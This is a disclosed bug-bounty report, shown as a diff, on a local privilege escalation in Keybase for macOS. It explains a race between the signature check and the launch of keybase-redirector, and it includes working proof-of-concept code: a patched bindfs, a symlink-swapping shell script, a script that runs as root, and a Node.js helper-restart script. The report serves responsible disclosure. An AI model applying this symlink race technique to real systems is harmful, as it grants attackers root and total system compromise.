@@ -1,0 +1,130 @@
+ReportLink:https://hackerone.com/reports/470398
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/votava
+ReportedTo:Keybase(keybase)
+BountyAmount:2500.0
+Severity:high
+State:Closed
+DateOfDisclosure:30.01.2019 18:15:40
+
+Summary:
+
+There's a local privilege escalation bug in the latest version of Keybase for
+macOS.
+
+The issue is in the process of launching `keybase-redirector`. The process works as follows:
+
+1. Copy `keybase-redirector` binary to a root-only location
+2. Check its signature
+3. Launch the binary
+
+[Code ref](https://github.com/keybase/client/blob/37b894b8e2a2b6cf023516900ef2ee9c058ca65f/osx/Helper/KBHelper.m#L213-L236).
+
+Note the following:
+
+1. There's a window between point 2. and 3. When the window is opened, the
+   binary is referenced using just its path.
+2. The `keybase-redirector` can be a symlink pointing to an arbitrary location
+   from the privileged location.
+
+The goal is to replace the real binary with a symlink which will first point to
+the real binary (for the signature verification process) and then updated to
+point to an evil binary/script for the launch.
+
+The window is tiny and thus reproducing this is a bit tricky. One can do it in
+many ways but the most complicated (while being the most fragile one at the
+same time!) is as follows:
+
+### 1. Install Keybase including the Finder integration
+### 2. Build and install bindfs with the following patch:
+
+```
+diff --git a/src/bindfs.c b/src/bindfs.c
+index baacb82..b80e396 100644
+--- a/src/bindfs.c
++++ b/src/bindfs.c
+@@ -1090,6 +1090,7 @@ static int bindfs_open(const char *path, struct fuse_file_info *fi)
+ static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,
+                        struct fuse_file_info *fi)
+ {
++    static int counter = 0;
+     int res;
+     (void) path;
+
+@@ -1101,6 +1102,9 @@ static int bindfs_read(const char *path, char *buf, size_t size, off_t offset,
+     if (res == -1)
+         res = -errno;
+
++    printf("%i\n", counter++);
++    fflush(stdout);
++
+     return res;
+ }
+```
+
+### 3. Run `doit.sh`.
+It will first create a few symlinks. This will allow the switch between the original binary and the evil one. It will then force a restart of `keybase-redirector` (by uninstalling it and installing it again). Finally, it will start bindfs, watch out for "502" and switch the symlinks.
+
+#### doit.sh
+```
+#!/bin/sh
+
+test -L /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector || cp /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector ~/exploit/keybase-redirector.orig
+
+mkdir -p ~/switcher
+ln -sf ~/switcher/switch /Applications/Keybase.app/Contents/SharedSupport/bin/keybase-redirector
+ln -sf ~/switcher/keybase-redirector.orig ~/exploit/switch
+
+(node restart-kbhelper/index.js && ls -l /pwned.txt) &
+
+bindfs -f ~/exploit ~/switcher | while read line
+do
+  [[ $line == "502" ]] && ln -sf ~/switcher/evil.sh ~/switcher/switch
+done
+```
+
+#### evil.sh
+```
+#!/bin/sh
+
+touch /pwned.txt
+```
+
+The restart is done using the MessagePack RPC using Node.js but you can do it
+in another way, it's just we had this laying around. The number 502 is a
+count of read requests for the FUSE file system. As you can imagine it's
+pretty fragile, but again, we were using bindfs anyway and this worked.
+
+#### restart-kbhelper/index.js
+```js
+const homedir = require("os").homedir();
+const rpc = require("framed-msgpack-rpc");
+const socket = `${homedir}/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock`;
+
+const x = rpc.createTransport({ path: socket });
+function restart() {
+    x.connect(() => {
+        const c = new rpc.Client(x, "keybase.1.install");
+        c.invoke('uninstallKBFS', [{}], () => {
+            c.invoke('installKBFS', [{}], (err, response) => {
+                console.log(JSON.stringify(response, 0, 2));
+                x.close();
+            });
+        });
+    });
+}
+
+restart();
+```
+
+
+A similar but better solution would be to simply write a custom read FUSE hook
+and return a different file once the original is read in the verification
+process. But again, the previous quick & dirty solution worked so why bother.
+
+We recorded a video showing it in action (attached). Note that this was joint
+effort by Jan Votava (https://twitter.com/elektronek) and Jiri Pospisil (https://twitter.com/jiripospisil) from https://sensible.io.
+
+## Impact
+
+A local user is able to run an arbitrary binary/script with root privileges leading to a total system compromise.
